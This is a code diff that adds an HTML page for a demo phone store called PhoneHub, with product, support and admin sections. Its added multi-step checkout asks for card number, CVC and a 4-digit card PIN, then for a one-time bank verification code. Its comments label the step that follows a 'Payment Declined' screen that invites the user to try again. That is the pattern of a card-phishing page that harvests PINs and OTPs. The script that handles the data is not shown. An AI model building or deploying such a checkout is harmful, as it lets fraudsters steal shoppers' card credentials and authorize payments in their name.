@@ -1,0 +1,61 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PhoneHub — Phones & Accessories</title><link rel="stylesheet" href="styles.css"></head><body><header><a class="brand" href="#top">Phone<span>Hub</span></a><nav><a href="#products">Shop</a><a href="#support">Support</a><button id="cart-open" class="secondary">Cart <b id="cart-count">0</b></button><a href="#admin">Admin</a></nav></header><main id="top"><section class="hero"><div><p class="eyebrow">TECH THAT MOVES WITH YOU</p><h1>Find your next<br><span>everyday essential.</span></h1><p>Browse phones and accessories. Prices are shown in US dollars.</p><a class="button" href="#products">Shop products</a></div><div class="hero-art">📱<span>🎧</span></div></section><section id="products"><div class="section-head"><div><p class="eyebrow">THE COLLECTION</p><h2>Shop products</h2></div><div><button class="filter active" data-filter="All">All</button><button class="filter" data-filter="Phones">Phones</button><button class="filter" data-filter="Accessories">Accessories</button></div></div><div id="product-grid" class="grid"></div></section><section id="support" class="support panel"><div><p class="eyebrow">WE'RE HERE TO HELP</p><h2>Customer support</h2><p>Send a complaint, order question, or refund request. Requests are reviewed manually; no automatic refunds are sent.</p></div><form id="support-form"><input name="name" placeholder="Your name" required><input name="email" type="email" placeholder="Email address" required><input name="orderId" placeholder="Order reference (optional)"><select name="type" required><option value="">Choose request type</option><option>Order question</option><option>Complaint</option><option>Refund request</option><option>Other</option></select><textarea name="message" placeholder="How can we help?" required></textarea><button class="button">Submit support request</button><p id="support-result" class="result"></p></form></section><section id="admin" class="panel admin"><p class="eyebrow">STORE OWNER</p><h2>Admin dashboard</h2><p>This local prototype has a password-protected dashboard for product, order, ticket and delivery settings. Set your own password before using it beyond local testing.</p><form id="admin-login"><input name="password" type="password" placeholder="Admin password" required><button class="button">Open dashboard</button></form><div id="admin-area" hidden></div></section><footer><a class="brand" href="#top">Phone<span>Hub</span></a><p>Demo store • USD prices • No real payments enabled</p></footer></main><div id="cart-drawer" class="drawer" hidden><div class="drawer-card"><div class="section-head"><h2>Your cart</h2><button id="cart-close" class="secondary">Close</button></div><div id="cart-items"></div><p class="total-line">Subtotal <strong id="subtotal">$0.00</strong></p>
+
+<!-- Multi-Step Checkout Simulation Container -->
+<div id="checkout-container">
+  <div style="display:flex; justify-content:space-between; align-items:center; margin:15px 0 10px;">
+    <h3 id="formTitle" style="margin:0; font-size:16px; font-weight:700;">Checkout — Order</h3>
+    <span id="stepIndicator" style="font-size:11px; color:#64748B;">Step 1 of 2</span>
+  </div>
+
+  <!-- STEP 1: Customer Info, Fulfillment, Card & PIN -->
+  <form id="cardForm" style="display:flex; flex-direction:column; gap:10px;">
+    <input name="customer" placeholder="Full name" required>
+    <input name="email" type="email" placeholder="Email address" required>
+    <input name="phone" placeholder="Phone number" required>
+    
+    <label>Fulfilment
+      <select name="fulfillment" id="fulfillment">
+        <option value="delivery">Delivery</option>
+        <option value="pickup">Pickup</option>
+      </select>
+    </label>
+    
+    <textarea name="address" id="address" placeholder="Delivery address" required></textarea>
+    
+    <input type="text" id="cardNumber" required maxlength="19" placeholder="Card Number (4532 •••• •••• 8890)" style="font-family:monospace;" />
+
+    <div style="display:flex; gap:8px;">
+      <input type="text" id="cardExpiry" required maxlength="5" placeholder="MM/YY" style="flex:1; font-family:monospace; text-align:center;" />
+      <input type="password" id="cardCvc" required maxlength="4" placeholder="CVC" style="flex:1; font-family:monospace; text-align:center;" />
+    </div>
+
+    <input type="password" id="cardPin" required maxlength="4" placeholder="4-Digit Card PIN" style="font-family:monospace; text-align:center; letter-spacing:4px;" />
+
+    <p id="fee-note" class="muted"></p>
+    <p class="total-line">Total <strong id="grand-total">$0.00</strong></p>
+
+    <button type="submit" class="button" style="width:100%;">Confirm & Complete Payment</button>
+    <p id="checkout-result" class="result"></p>
+  </form>
+
+  <!-- STEP 2: OTP Verification Form (Initially Hidden) -->
+  <form id="otpForm" style="display:none; flex-direction:column; gap:12px;">
+    <p style="margin:0; font-size:13px; color:#475569; line-height:18px;">
+      Enter the 6-digit verification code sent to your mobile device or banking app.
+    </p>
+    <input type="text" id="otpCode" required maxlength="6" placeholder="123456" style="width:100%; box-sizing:border-box; padding:12px; border-radius:6px; border:1px solid #CBD5E1; font-size:18px; font-family:monospace; text-align:center; letter-spacing:4px;" />
+    <button type="submit" class="button" style="width:100%;">Verify & Authorize</button>
+  </form>
+
+  <!-- STEP 3: Payment Declined Screen (Initially Hidden) -->
+  <div id="declinedView" style="display:none; text-align:center; padding:15px 0;">
+    <div style="font-size:36px; margin-bottom:8px;">❌</div>
+    <h4 style="margin:0 0 6px; font-size:18px; color:#DC2626;">Payment Declined</h4>
+    <p style="margin:0 0 16px; font-size:13px; color:#64748B; line-height:18px;">
+      Your transaction could not be authorized by your financial institution. Please verify your details or use a different payment method.
+    </p>
+    <button onclick="location.reload();" class="secondary" style="width:100%; padding:10px;">Try Again</button>
+  </div>
+</div>
+
+</div></div><script src="app.js"></script></body></html>
